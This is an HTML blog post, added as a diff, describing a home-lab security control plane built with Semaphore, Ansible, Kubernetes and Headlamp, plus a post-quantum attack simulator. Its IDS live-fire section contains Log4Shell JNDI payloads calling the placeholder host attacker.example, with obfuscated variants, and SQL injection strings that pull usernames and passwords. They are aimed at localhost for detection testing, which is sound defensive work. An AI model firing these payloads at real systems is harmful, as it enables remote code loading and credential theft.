@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="canonical" href="https://ikonstas70.github.io/articles/security-automation-lab">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>From Scripts to a Security Control Plane: Pentest Automation with Ansible, Semaphore and Kubernetes — Konstas Engineering Notes</title>
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="description" content="How a year of penetration-testing, IDS live-fire and post-quantum attack-simulation scripts became one self-hosted security control plane: Ansible playbooks, a Semaphore web console with 400 one-click jobs, and a hardened Kubernetes cluster watched through Headlamp.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://ikonstas70.github.io/articles/security-automation-lab">
+<meta property="og:title" content="From Scripts to a Security Control Plane">
+<meta property="og:description" content="A year of pentest, IDS live-fire and post-quantum attack-simulation scripts, turned into one self-hosted control plane with Ansible, Semaphore and Kubernetes.">
+<meta property="og:image" content="https://ikonstas70.github.io/articles/security-automation-lab/semaphore-pentest-toolkits.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="stylesheet" href="/style.css">
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BZK50T0JFT"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag("js",new Date());gtag("config","G-BZK50T0JFT");</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"From Scripts to a Security Control Plane: Pentest Automation with Ansible, Semaphore and Kubernetes","author":{"@type":"Person","name":"Ioannis Alexander Konstas","alternateName":"Ioannis Konstas","url":"https://ikonstas70.github.io/about"},"datePublished":"2026-11-02","image":"https://ikonstas70.github.io/articles/security-automation-lab/semaphore-pentest-toolkits.jpg","keywords":"penetration testing, IDS, Ansible, Semaphore, Kubernetes, Headlamp, post-quantum cryptography, ML-KEM, security automation"}</script>
+</head>
+<body>
+<div class="wrap">
+  <header class="site">
+    <img src="/ioannis-portrait.jpg" alt="Ioannis Konstas" style="float:left;width:72px;height:72px;object-fit:cover;border-radius:50%;border:1px solid hsl(43 45% 56% / .85);box-shadow:0 0 0 4px hsl(43 45% 56% / .12), 0 3px 14px rgb(0 0 0 / .5);margin:0 18px 6px 0;">
+    <a class="brand" href="/">Konstas<em>.</em>Engineering Notes</a>
+    <div class="tagline">Networking &middot; Cybersecurity &middot; Infrastructure</div>
+    <div style="clear:both;"></div>
+    <div class="rule"></div>
+    <nav class="top">
+      <a href="/">Articles</a>
+      <a href="/awareness/">Security Awareness</a>
+      <a href="/data-science/">Data Science</a>
+      <a href="/readings">Readings</a>
+      <a href="/index-az">Index</a>
+      <a href="/search">Search</a>
+      <a href="/articles/sentinel-platform">SENTINEL</a>
+      <a href="/stack">Stack</a>
+      <a href="/about">About</a>
+    </nav>
+  </header>
+
+  <main>
+    <span class="tag">Security Automation &middot; Portfolio</span>
+    <h1>From Scripts to a Security Control Plane: Pentest Automation with Ansible, Semaphore and Kubernetes</h1>
+    <p class="meta">Articles &middot; November 2026 &middot; Ioannis Konstas</p>
+
+<blockquote>Over one year I wrote close to four hundred security scripts: penetration tests, IDS live-fire drills, post-quantum attack simulations, hardening checks and the jobs that keep a self-hosted stack alive. Each one worked. Together they were a drawer full of tools that only I knew how to use. This is how that drawer became a control plane: every script one click away, every run logged, and the platform itself running on a hardened Kubernetes cluster.</blockquote>
+
+<p>Security engineering produces scripts the way a workshop produces offcuts. You test a WAF rule, so you write a script that fires the attack. You tighten a cipher suite, so you write a script that proves it. You worry about quantum computers, so you write a simulator that plays the adversary. A year later the scripts are spread across a dozen folders and seventeen Git repositories, each with its own flags, interpreter and assumptions.</p>
+<p>The problem is not the scripts. It is that they have no <em>operations layer</em>: no single place to see what exists, run it safely, read the result and prove later what was run and when. Enterprises solve this with Red Hat Ansible Automation Platform (AWX upstream). I wanted the same discipline in a home lab, on one machine, with nothing exposed to the network.</p>
+
+<h2 id="architecture">Architecture</h2>
+<figure style="margin:22px 0 28px">
+<svg viewBox="0 0 760 380" role="img" aria-label="Git repositories feed a Semaphore control plane that runs Ansible and script jobs against the local host and a Kubernetes cluster" style="width:100%;height:auto;border:1px solid hsl(43 45% 56% / .35);border-radius:10px;background:hsl(0 0% 6%)" font-family="Inter, -apple-system, sans-serif" font-size="13">
+<defs><marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="hsl(43 45% 56%)"/></marker></defs>
+<text x="24" y="34" font-size="15" font-weight="600" fill="hsl(0 0% 97%)">One control plane in front of every security tool</text>
+<rect x="24" y="64" width="190" height="128" rx="8" fill="none" stroke="hsl(0 0% 40%)"/>
+<text x="40" y="88" font-weight="600" fill="hsl(0 0% 97%)">Source of truth</text>
+<text x="40" y="110" font-size="11.5" fill="hsl(0 0% 85%)">17 security Git repos</text>
+<text x="40" y="126" font-size="11.5" fill="hsl(0 0% 85%)">Local script folders</text>
+<text x="40" y="142" font-size="11.5" fill="hsl(0 0% 85%)">Ansible playbooks</text>
+<text x="40" y="172" font-size="11.5" fill="hsl(0 0% 62%)">Encrypted at rest (git-crypt)</text>
+<rect x="270" y="64" width="220" height="170" rx="8" fill="hsl(43 45% 56% / .12)" stroke="hsl(43 45% 56%)" stroke-width="2"/>
+<text x="286" y="88" font-weight="600" fill="hsl(0 0% 97%)">Semaphore control plane</text>
+<text x="286" y="110" font-size="11.5" fill="hsl(0 0% 85%)">Projects &#8594; subgroups &#8594; jobs</text>
+<text x="286" y="126" font-size="11.5" fill="hsl(0 0% 85%)">~400 one-click templates</text>
+<text x="286" y="142" font-size="11.5" fill="hsl(0 0% 85%)">Schedules + run history</text>
+<text x="286" y="158" font-size="11.5" fill="hsl(0 0% 85%)">Inline warnings per job</text>
+<text x="286" y="174" font-size="11.5" fill="hsl(0 0% 85%)">One hardened script runner</text>
+<text x="286" y="214" font-size="11.5" fill="hsl(0 0% 62%)">Loopback only, admin login</text>
+<rect x="546" y="64" width="190" height="80" rx="8" fill="none" stroke="hsl(0 0% 40%)"/>
+<text x="562" y="88" font-weight="600" fill="hsl(0 0% 97%)">Host jobs</text>
+<text x="562" y="108" font-size="11.5" fill="hsl(0 0% 85%)">Pentest &amp; IDS tests</text>
+<text x="562" y="124" font-size="11.5" fill="hsl(0 0% 85%)">Service status / restart</text>
+<rect x="546" y="160" width="190" height="80" rx="8" fill="none" stroke="hsl(0 0% 40%)"/>
+<text x="562" y="184" font-weight="600" fill="hsl(0 0% 97%)">Ansible</text>
+<text x="562" y="204" font-size="11.5" fill="hsl(0 0% 85%)">Health of every system</text>
+<text x="562" y="220" font-size="11.5" fill="hsl(0 0% 85%)">Declarative K8s state</text>
+<rect x="270" y="272" width="466" height="84" rx="8" fill="hsl(0 0% 9%)" stroke="hsl(0 0% 30%)"/>
+<text x="286" y="296" font-weight="600" fill="hsl(0 0% 97%)">Kubernetes (kind) + Headlamp</text>
+<text x="286" y="316" font-size="11.5" fill="hsl(0 0% 85%)">Encrypted audit application: 1 replica, non-root, read-only root FS, probes</text>
+<text x="286" y="334" font-size="11.5" fill="hsl(0 0% 62%)">Observed through Headlamp; reconciled by Ansible</text>
+<g fill="none" stroke="hsl(43 45% 56%)" stroke-width="1.25"><path d="M214 128H270" marker-end="url(#a)"/><path d="M490 104H546" marker-end="url(#a)"/><path d="M490 200H546" marker-end="url(#a)"/><path d="M641 240V272" marker-end="url(#a)"/></g>
+</svg>
+<figcaption style="font-size:.85rem;color:var(--fg-dim);margin-top:8px">Scripts stay in their repositories. The control plane only references them, so Git remains the single source of truth and nothing is copied into a database.</figcaption>
+</figure>
+
+<h2 id="control-plane">The control plane: every test, one click away</h2>
+<p>Semaphore is a lightweight, open-source web front end for Ansible and plain scripts. I chose it over AWX for a practical reason: AWX wants several gigabytes of RAM for its operator, database and task containers, and this host already runs a SIEM. Semaphore is a single binary. The concepts are the same ones AWX teaches: <strong>projects</strong> hold work, <strong>repositories</strong> say where code lives, <strong>inventories</strong> say where it runs, and <strong>templates</strong> are saved, repeatable jobs.</p>
+<p>The security work lives in its own project, <em>Pentest &amp; Vulnerability Testing 2026</em>, split into subgroups that mirror how an assessment is actually performed: local tests, pentest toolkits, network testing, hardening and monitoring, reports and references, and infrastructure. 172 jobs, each tagged with what it touches.</p>
+<figure style="margin:22px 0 28px">
+<img alt="Semaphore UI showing the Pentest Toolkits subgroup: IDS and WAF analyzers, OWASP scanner jobs, post-quantum attack simulation, a pentest PDF report generator, Snort and Wazuh tooling, and web-security live-fire tests, each with a run button" src="/articles/security-automation-lab/semaphore-pentest-toolkits.jpg" width="1260" height="952" loading="lazy" style="width:100%;height:auto;border:1px solid hsl(43 45% 56% / .35);border-radius:10px">
+<figcaption style="font-size:.85rem;color:var(--fg-dim);margin-top:8px">The Pentest Toolkits subgroup. Every row is a saved job; the play button runs it and keeps the full output in the task history.</figcaption>
+</figure>
+<p>A job's description carries its blast radius in plain words: <em>sends security test traffic</em>, <em>needs sudo</em>, <em>changes the firewall</em>, <em>posts publicly</em>. Jobs that could take a public service down or launch cloud resources are deliberately <strong>status-only</strong>. A control plane that makes dangerous actions easy is worse than no control plane.</p>
+
+<h3>One runner for four hundred scripts</h3>
+<p>Writing four hundred wrappers would have been its own maintenance problem. Instead every job calls the same small runner, which picks the interpreter, refuses anything outside the owner's home directory and feeds the script an empty input. That last detail matters: a script that waits for a password would otherwise hang a job forever. With <code>/dev/null</code> as input it stops immediately and says why.</p>
+<pre><code>#!/bin/bash
+# Runs one of this machine's own scripts with the right interpreter.
+S=${1:-}; shift || true
+[[ -n $S &amp;&amp; -f $S ]] || { echo "No such script: $S"; exit 2; }
+case $(cd "$(dirname "$S")" &amp;&amp; pwd -P)/ in "$HOME"/*) ;; *) echo "Only scripts under \$HOME are allowed."; exit 2 ;; esac
+cd "$(dirname "$S")"
+case $S in
+  *.py)       RUN=(python3) ;;
+  *.mjs|*.js) RUN=(node) ;;
+  *.sh)       [[ $(head -1 "$S") == *zsh* ]] &amp;&amp; RUN=(zsh) || RUN=(bash) ;;
+  *)          echo "Unknown script type: $S"; exit 2 ;;
+esac
+exec "${RUN[@]}" "$S" "$@" &lt; /dev/null</code></pre>
+<p>One lesson from building it: Semaphore's shell runner invokes <code>bash</code> explicitly and ignores the shebang. My first version used a zsh-only array lookup, which bash read as an unbound variable. The fix was to make every helper portable bash, and to verify that a failing script turns the job red instead of green. A dashboard that reports success on failure is a liability.</p>
+
+<h2 id="live-fire">IDS live-fire: attacking yourself on purpose</h2>
+<p>A detection rule you have never seen fire is a hypothesis. The live-fire test turns it into evidence. It runs only against <code>localhost</code>, and for every rule category it sends a <em>direct</em> hit and then <em>evasion</em> variants: case tricks, inline comments, double URL encoding. The goal is not just "does the IDS catch the attack" but "does it still catch it when the attacker is clever."</p>
+<pre><code>TARGET="http://localhost:${1:-8080}"   # local test target only
+DELAY=0.4
+
+_req() {
+    local label="$1"; shift
+    printf "  %-55s" "$label"
+    code=$(curl -sk -o /dev/null -w "%{http_code}" "$@" 2&gt;/dev/null)
+    echo "&#8594; HTTP $code"
+    sleep "$DELAY"
+}
+
+# Log4Shell / JNDI (CVE-2021-44228): direct, then obfuscated
+_req "Classic JNDI inject in header" -H 'X-Api-Version: ${jndi:ldap://attacker.example/x}' "$TARGET/"
+_req "Obfuscated \${lower:j}ndi prefix" "$TARGET/?v=\${lower:j}ndi:ldap://attacker.example/"
+_req "Double-URL-encoded JNDI" "$TARGET/?x=%24%7bjndi%3aldap%3a%2f%2fattacker.example%7d"
+
+# SQL injection: classic, then comment-separated to defeat naive regexes
+_req "Classic UNION SELECT" "$TARGET/search?q=1+UNION+SELECT+username,password+FROM+users--"
+_req "UNION/**/SELECT (inline comment)" "$TARGET/api?id=1+UNION/**/SELECT/**/1,2,3--"</code></pre>
+<p>The pattern is reusable for any rule set: pair each signature with the encodings an attacker would try next, run the pair, and compare what the sensor logged against what you expected. The advanced variant goes further with chunked bodies, header smuggling and Unicode normalization.</p>
+
+<h2 id="pqc">Harvest now, decrypt later: simulating a quantum adversary</h2>
+<p>Traffic recorded today can be decrypted the day a cryptographically relevant quantum computer exists. The defense is hybrid encryption: a classical X25519 exchange <em>and</em> NIST's post-quantum ML-KEM-768 (FIPS 203), both feeding one key-derivation function, with ML-DSA-65 (FIPS 204) signatures on top. An attacker has to break both.</p>
+<p>The simulator plays the adversary in six rounds: brute-forcing the ML-KEM key space, assuming Shor's algorithm has already broken X25519, trying a different post-quantum key, forging a signature, replaying captured ciphertext, and finally confirming that the legitimate owner still decrypts. Here is the harvest-now round, condensed:</p>
+<pre><code>KEM_ALG = "ML-KEM-768"
+
+# The attacker's own keypair stands in for a future quantum machine
+with oqs.KeyEncapsulation(KEM_ALG) as kem_atk:
+    _ = kem_atk.generate_keypair()
+    wrong_priv = kem_atk.export_secret_key()
+
+try:
+    with oqs.KeyEncapsulation(KEM_ALG, secret_key=wrong_priv) as kem_wrong:
+        wrong_ss = kem_wrong.decap_secret(ct_kem)          # wrong shared secret
+
+    hkdf = HKDF(algorithm=hashes.SHA3_256(), length=32, salt=None, info=b"PQC-HYBRID-v1")
+    AESGCM(hkdf.derive(wrong_ss + bytes(32))).decrypt(nonce, ct_aes, aad)
+    log_result("Wrong PQC key rejected", False, "CRITICAL FAILURE")
+except Exception:
+    # Wrong secret &#8594; wrong AES key &#8594; GCM authentication tag mismatch
+    log_result("Wrong ML-KEM-768 private key rejected", True,
+               "decapsulation with the wrong key yields a wrong secret; AES-GCM fails")</code></pre>
+<p>The interesting property is that ML-KEM decapsulation with the wrong key does not raise an error. It quietly returns a <em>different</em> shared secret (implicit rejection, by design). The failure surfaces one layer later, when AES-GCM's authentication tag refuses to verify. The test asserts the system fails closed at exactly that point.</p>
+
+<h2 id="kubernetes">Running the platform on Kubernetes</h2>
+<p>The lab's encrypted audit application moved from a background service to a single-node Kubernetes cluster built with kind. Headlamp, the Kubernetes SIG web UI, gives the cluster a face: health rings for every workload type, and a map of how resources connect.</p>
+<figure style="margin:22px 0 28px">
+<img alt="Headlamp workloads overview: 11 pods healthy, 4 deployments running, 2 daemon sets running and 7 replica sets running, all at 100 percent, with a table of workloads by namespace" src="/articles/security-automation-lab/headlamp-workloads.jpg" width="1260" height="952" loading="lazy" style="width:100%;height:auto;border:1px solid hsl(43 45% 56% / .35);border-radius:10px">
+<figcaption style="font-size:.85rem;color:var(--fg-dim);margin-top:8px">Every workload at 100%. The audit application sits in its own namespace next to the cluster's own components.</figcaption>
+</figure>
+<figure style="margin:22px 0 28px">
+<img alt="Headlamp map with every group expanded: the kube-system namespace with CoreDNS, kube-proxy, kindnet and control-plane pods, and the audit-platform namespace showing a Deployment fanning out to ReplicaSets, one running Pod, a Service, Endpoints and an EndpointSlice" src="/articles/security-automation-lab/headlamp-map.jpg" width="1260" height="952" loading="lazy" style="width:100%;height:auto;border:1px solid hsl(43 45% 56% / .35);border-radius:10px">
+<figcaption style="font-size:.85rem;color:var(--fg-dim);margin-top:8px">The map makes Kubernetes' ownership chain visible: Deployment &#8594; ReplicaSet &#8594; Pod &#8594; Service. The empty ReplicaSets are earlier revisions kept for rollback.</figcaption>
+</figure>
+<p>The design decisions are where the security thinking shows. The application writes one encrypted store, so two writers would corrupt it: the Deployment runs <strong>exactly one replica</strong> with the <strong>Recreate</strong> strategy, which deliberately trades zero-downtime updates for data integrity. Knowing when <em>not</em> to use a Kubernetes feature is part of using it well.</p>
+<pre><code>spec:
+  replicas: 1
+  strategy:
+    type: Recreate              # never two writers on the encrypted store
+  template:
+    spec:
+      automountServiceAccountToken: false
+      securityContext:
+        runAsNonRoot: true
+      containers:
+        - name: audit-platform
+          securityContext:
+            allowPrivilegeEscalation: false
+            readOnlyRootFilesystem: true
+            capabilities: { drop: [ALL] }
+          readinessProbe: { tcpSocket: { port: http }, periodSeconds: 5 }
+          livenessProbe:  { tcpSocket: { port: http }, periodSeconds: 20 }
+          resources:
+            requests: { cpu: 50m, memory: 128Mi }
+            limits:   { memory: 1Gi }</code></pre>
+<p>Deleting the pod by hand proved the point of the whole exercise: the ReplicaSet controller saw "want one, have zero" and had a replacement scheduled within a second, with a new name and IP but the same data, because the data lives on a volume outside the pod. The Service kept the address stable, so nothing in front of it noticed.</p>
+
+<h2 id="ansible">Ansible: declarative, idempotent, honest about offline hosts</h2>
+<p>Ansible ties the systems together: a health check of every machine each morning, and a playbook that reconciles the Kubernetes application against its manifest. Run it twice and the second run reports <code>changed=0</code>. That is idempotency, the property that makes automation safe to repeat.</p>
+<pre><code>- name: Check all my systems
+  hosts: all
+  gather_facts: false
+  ignore_unreachable: true
+  tasks:
+    - name: Collect basic facts (OS, uptime, memory)
+      ansible.builtin.setup:
+        gather_subset: [min, hardware]
+
+    - name: Skip systems that are offline
+      ansible.builtin.meta: end_host
+      when: ansible_facts.hostname is not defined</code></pre>
+<p>Laptops sleep and lab servers are switched off to save money. Without the <code>end_host</code> guard, one offline machine turned the whole report red. With it, offline systems are reported as unreachable and the run still finishes clean.</p>
+
+<h2 id="lessons">Lessons that only show up when you build it</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>Symptom</th><th>Cause</th><th>Takeaway</th></tr></thead>
+<tbody>
+<tr><td>A token "worked" in testing, then failed alone</td><td>The CLI also sent an admin client certificate, and the API server authenticated that first</td><td>Test credentials in isolation, with nothing else attached</td></tr>
+<tr><td>A Helm upgrade refused to apply</td><td>A hand-made RBAC binding reused the name of one the chart owns</td><td>Never share object names with a package manager</td></tr>
+<tr><td>A pod took 30 seconds to stop</td><td>Node.js as PID 1 ignores SIGTERM until the grace period ends</td><td>Handle SIGTERM or run a tiny init process</td></tr>
+<tr><td>One failed readiness probe on every start</td><td>The probe fires before the server binds its port</td><td>One early failure is normal; repeated liveness failures are not</td></tr>
+<tr><td>Installing a tool replaced the system's default Python</td><td>A package manager relinked the interpreter other scripts relied on</td><td>Check what an install changes, not just that it succeeded</td></tr>
+</tbody></table></div>
+
+<h2 id="standards">Mapped to the controls auditors ask about</h2>
+<ul>
+<li><strong>NIST SP 800-53 CA-8, Penetration Testing:</strong> repeatable, scheduled self-tests with retained results.</li>
+<li><strong>SI-4, System Monitoring:</strong> IDS live-fire proves detections fire, including against evasion.</li>
+<li><strong>AU-2 / AU-12, Audit Events:</strong> every job run is recorded with who, when and the full output.</li>
+<li><strong>CM-2 / CM-6, Baseline Configuration:</strong> Ansible reconciles declared state and reports drift.</li>
+<li><strong>SC-12 / SC-13, Cryptographic Protection:</strong> hybrid ML-KEM-768 + X25519 with ML-DSA-65, tested adversarially.</li>
+<li><strong>AC-6, Least Privilege:</strong> non-root containers, dropped capabilities, no service-account tokens, status-only controls for risky jobs.</li>
+</ul>
+
+<h2 id="takeaway">The takeaway</h2>
+<p>Tools are easy; operations are hard. The scripts were already good. What changed is that they now have the properties an enterprise security team expects: discoverable, repeatable, scheduled, logged, least-privileged and honest when something fails. The same structure transfers directly to AWX or Ansible Automation Platform, and the Kubernetes manifests to any managed cluster. The home lab is simply where the discipline is cheapest to practice.</p>
+<p style="font-size:.85rem;color:var(--fg-dim)">All testing described here was performed only against systems I own and operate. Hostnames, addresses, internal paths and detection details have been removed from the screenshots and code.</p>
+  </main>
+
+  <footer class="site">
+    <p>&copy; 2026 Ioannis Konstas &middot; <a href="https://github.com/ikonstas70">github.com/ikonstas70</a></p>
+  </footer>
+</div>
+</body>
+</html>
